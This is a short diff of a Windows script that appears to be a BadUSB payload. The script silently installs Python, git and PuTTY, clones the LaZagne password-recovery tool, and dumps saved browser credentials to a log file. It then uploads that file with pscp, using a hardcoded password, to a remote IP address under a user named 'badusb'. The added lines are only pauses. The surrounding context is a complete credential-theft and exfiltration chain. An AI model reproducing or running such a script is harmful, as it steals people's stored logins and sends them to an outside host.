@@ -10,19 +10,27 @@ python-3.9.9-amd64.exe /quiet InstallAllUsers=1 PrependPath=1"
 
 choco install git -y
 
+sleep 2
+
 git clone https://github.com/AlessandroZ/LaZagne.git
 
 cd LaZagne
 
+sleep 2
+
 pip install -r requirements.txt
 
 cd Windows
+
+sleep 2
 
 python laZagne.py browsers > logs.txt
 
 curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/putty-64bit-0.78-installer.msi
 
 msiexec /i putty-64bit-0.78-installer.msi /qn
+
+sleep 2
 
 echo y | pscp -pw lolmdr123 logs.txt badusb@51.83.71.188:/var/tmp
 
